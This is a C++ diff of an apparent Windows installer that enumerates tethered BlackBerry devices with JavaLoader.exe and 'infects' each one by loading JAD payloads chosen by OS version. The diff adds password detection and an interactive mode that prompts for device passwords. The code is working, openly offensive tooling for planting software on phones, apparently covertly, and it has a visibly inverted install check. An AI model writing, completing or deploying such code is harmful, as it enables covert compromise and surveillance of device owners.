@@ -8,6 +8,9 @@
 #include <string>
 #include <iostream>
 #include <vector>
+#include <algorithm>
+
+#include <iterator>
 
 #include <fstream>
 #include <sstream>
@@ -19,16 +22,29 @@
 using namespace std;
 
 const wstring JAVALOADER = L"JavaLoader.exe";
+
 //const wstring JADDIR = L"";
 const wstring JADEXT = L"jad";
 const wstring INTERRUPT_ERROR = L"Error";
+const wstring INTERRUPT_PASSWORD = L"Password Protected";
 
-boolean debugEnabled = true;
+boolean debugOnFile = true;
 //wostream & debug = debugEnabled? wofstream(L"debug.txt", ios::out | ios::app): wcout;
 wofstream fdebug(L"inst.txt", ios::out | ios::trunc);
-wostream & debug = debugEnabled? fdebug: wcout;
+
+#define debug (debugOnFile? fdebug: wcout)
+//wostream & debug = debugEnabled? fdebug: wcout;
+
+boolean interactive=false;
 
 enum infect_result { OK, IS_INSTALLED, NOT_INSTALLED, ERR_PASSWORD, ERR_DIR, ERR_LOAD, ERR_GENERIC, ERR_COM, NOT_YET  };
+
+wstring upper_string(wstring& str)
+{
+	wstring upper;
+	std::transform(str.begin(), str.end(), back_inserter(upper), toupper);
+	return upper;
+}
 
 wstring ExePath() {
 	WCHAR szEXEPath[2048];
@@ -130,7 +146,8 @@ wstring Replace(const wstring& orig,const wstring& fnd, const wstring& repl)
 
 // execute a command and returns the stdout
 wstring exec(wstring cmd, wstring args) {
-	wstring interrupt = INTERRUPT_ERROR;
+	
+
 	SetCurrentDirectoryW(ExePath().c_str());
 	wstring full_path=cmd + L" " + args;
 	//wstring full_path = L"\"" + ExePath() + L"\\" + cmd + L"\" " + args;
@@ -140,7 +157,7 @@ wstring exec(wstring cmd, wstring args) {
 	FILE* pipe = _wpopen(full_path.c_str(), L"r");
 	if (!pipe) {
 		debug<<"Exe not found"<<endl;
-		return L"ERROR";
+		return L"NOTFOUND";
 	}
 
 	const int size = 128;
@@ -149,14 +166,24 @@ wstring exec(wstring cmd, wstring args) {
 	while(!feof(pipe)) {
 		if(fgetws(buffer, size, pipe) != NULL){
 			result += buffer;
-			if(result.find(interrupt)!=-1){
-				_pclose(pipe);
-				debug<<result<<endl;
-				return L"INTERRUPT";
-			}
+			
 		}
 	}
+
+	if(result.find(INTERRUPT_PASSWORD)!=wstring::npos){
+		_pclose(pipe);
+		debug<<result<<endl;
+		return L"PASSWORD";
+	}
+
+	if(result.find(INTERRUPT_ERROR)!=wstring::npos){
+		_pclose(pipe);
+		debug<<result<<endl;
+		return L"ERROR";
+	}
+
 	_pclose(pipe);
+	Sleep(300);
 	return result;
 }
 
@@ -168,21 +195,37 @@ bool needToInfect(wstring pin, set<wstring> argv )
 }
 
 
-boolean isError( wstring execResult ) 
+int isError( wstring execResult ) 
 {
-	boolean pos = execResult.find(L"The system cannot find") != wstring::npos;
-	boolean ret = (execResult==L"ERROR" || execResult==L"INTERRUPT" || pos);
+	wstring upperResult=upper_string(execResult);
+	boolean Ecan = upperResult.find(L"THE SYSTEM CANNOT FIND") != wstring::npos;
+	boolean Eerr = upperResult.find(L"ERROR") != wstring::npos;
+	boolean Enot = upperResult.find(L"NOTFOUND") != wstring::npos;
+	boolean Epas = upperResult.find(L"PASSWORD") != wstring::npos;
+	int ret = (Ecan << 0 | Eerr << 1 | Enot << 2 | Epas << 3);
 	return ret;
+}
+
+wstring execJloader(wstring pin, wstring password, wstring  param ) 
+{
+	wstring result;
+	if(password.length()==0){
+		result = exec( JAVALOADER, L" -p" + pin + L" " + param);
+	}else{
+		result = exec( JAVALOADER, L" -p" + pin +  L" -w" + password + L" " + param);
+	}
+	return result;
 }
 
 // gets the OS version of a specific device.
 // the version is a number of 4 digits.
 // The mayor is represented by the first 2 digits
 // ex: OS 4.6.1 is: 4061
-boolean GetBBVersion(wstring pin, int* version ) 
+boolean GetBBVersion(wstring pin,  wstring password, int* version) 
 {
-	wstring vresult = exec( JAVALOADER, L" -p" + pin + L" deviceinfo ");
+	wstring vresult=execJloader(pin, password,L"deviceinfo") ;
 
+	
 	std::wistringstream iss(vresult);
 	std::wstring lversion;
 	//wchar_t delimiter = L'\n'
@@ -208,12 +251,16 @@ boolean GetBBVersion(wstring pin, int* version )
 
 }
 
+
+
 // load a speficic jad on a device identified by its pin
 // returns OK or ERR_LOAD
-infect_result loadJad(wstring pin, wstring jadname){
-	wstring instresult = exec( JAVALOADER, L" -p" + pin + L" load " + jadname);
+infect_result loadJad(wstring pin, wstring password, wstring jadname){
+	wstring instresult=execJloader(pin, password, L"load " + jadname);
+
 	debug << instresult<< endl;
-	if(isError(instresult)){
+	if(int error = isError(instresult)){
+		debug<< "loadJad error: "<<error<< endl;
 		return ERR_LOAD;
 	}
 	return OK;
@@ -221,7 +268,7 @@ infect_result loadJad(wstring pin, wstring jadname){
 
 // infect a pin with the correct jad
 // returns OK or ERR_LOAD
-infect_result infect( wstring pin ) 
+infect_result infect( wstring pin, wstring password ) 
 {
 	bool result = false;
 	
@@ -230,7 +277,7 @@ infect_result infect( wstring pin )
 	int iRC = 0;
 
 	int version =0 ;
-	boolean ret = GetBBVersion(pin, &version);
+	boolean ret = GetBBVersion(pin, password, &version);
 	debug<< ret << " version: " << version << endl;
 
 	infect_result infected=NOT_YET;
@@ -244,13 +291,13 @@ infect_result infect( wstring pin )
 
 		// see if it's at least OS 5.0
 		if(version>=5000){
-			infected=loadJad(pin,L"inst50.jad");
+			infected=loadJad(pin,password,L"inst50.jad");
 		}
 
 		// try 
 		Sleep(300);
 		if(infected!=OK){
-			infected=loadJad(pin,L"inst40.jad");
+			infected=loadJad(pin,password,L"inst45.jad");
 		}
 								
 	}	
@@ -261,23 +308,12 @@ infect_result infect( wstring pin )
 
 // check if the pin is already installed or not.
 // if there are no errors it returns IS_INSTALLED or NOT_INSTALLED
-infect_result isInstalled( std::wstring pin ) 
+infect_result isInstalled( wstring pin, wstring password ) 
 {
+	wstring installedcodlist = execJloader( pin, password, L" dir -1");
 
-    wstring installedcodlist = exec( JAVALOADER, L" -p" + pin + L" dir -1");
-
-	if( installedcodlist.find(L"Enter password")!=wstring::npos){
-		debug << "PASSWORD PROTECTED" << endl;
-		return ERR_PASSWORD;
-	}
-
-	if( installedcodlist.find(L"COM error during Open")!=wstring::npos){
-		debug << "COM ERROR" << endl;
-		return ERR_COM;
-	}
-
-	if(isError(installedcodlist) ){
-		debug << "GENERIC ERROR" << endl;
+	if(int error = isError(installedcodlist) ){
+		debug << "ERROR: " << error << endl;
 		return ERR_GENERIC;
 	}
 
@@ -292,12 +328,52 @@ infect_result isInstalled( std::wstring pin )
 }
 
 
+/*
+
+if(interactive){
+	javaloadersilent enum
+	foreach(pin){
+		javaloadersilent deviceinfo
+		if(password protected){
+			cin >> passwd 
+			javaloadersilent -wpassword deviceinfo
+		}
+
+}else{
+	javaloadersilent enum
+	foreach(pin){
+		javaloadersilent deviceinfo
+		if(password protected){
+			continue;
+	}	
+}
+
+*/
+
+boolean checkPasswordProtected( std::wstring pin ) 
+{
+	wstring result = execJloader( pin,L"", L"deviceinfo");
+	
+	int error = isError(result);
+	debug<<"checkPasswordProtected error: "<<error<<endl;
+
+	int prot = error & (1<<3);
+	return prot > 0;
+}
+
 int _tmain(int argc, _TCHAR* argv[])
 {
-
 	int infected=0;
 	bool force=false;
 
+	if(argc==2){
+		if(wstring(argv[1])==L"interactive"){
+			debugOnFile=false;
+			interactive = true;
+			force=true;
+		}
+	}
+			
 	debug << time(NULL) << endl;
 	wstring result = exec( JAVALOADER, L" enum");
 
@@ -308,6 +384,8 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	std::wistringstream iss(result);
 	std::wstring pin;
+	std::wstring password;
+	boolean password_protected = false;
 	//wchar_t delimiter = L'\n'
 	
 	int i=0;
@@ -317,10 +395,26 @@ int _tmain(int argc, _TCHAR* argv[])
 		
 		if(pin.substr(0,2) == L"0x"){
 			debug<< ++i << " -> " <<pin << endl;
-			Sleep(300);
-			if(force || isInstalled(pin) == NOT_INSTALLED){
-				Sleep(300);
-				if(infect(pin)==OK){
+
+			password_protected = checkPasswordProtected(pin);
+			debug<<"password_protected: "<<password_protected<<endl;
+
+			if(password_protected && interactive){
+				cout<<"Insert password:"<<endl;
+				wcin>>password;
+			}
+			
+			/*
+			1) no prot, isinstalled
+			2) prot, pass, isinstalled
+			
+
+			*/
+
+			if(  !password_protected || password.length()>0 ){
+
+				boolean installed = isInstalled(pin, password) == NOT_INSTALLED;
+				if(!installed && infect(pin, password)==OK){
 					debug<<"INSTALLED "<<pin<<endl;
 					infected++;
 				}else{
@@ -332,6 +426,6 @@ int _tmain(int argc, _TCHAR* argv[])
 		}		
 	}
 		
-	return infected;
+	return infected?EXIT_SUCCESS:EXIT_FAILURE;
 }
 
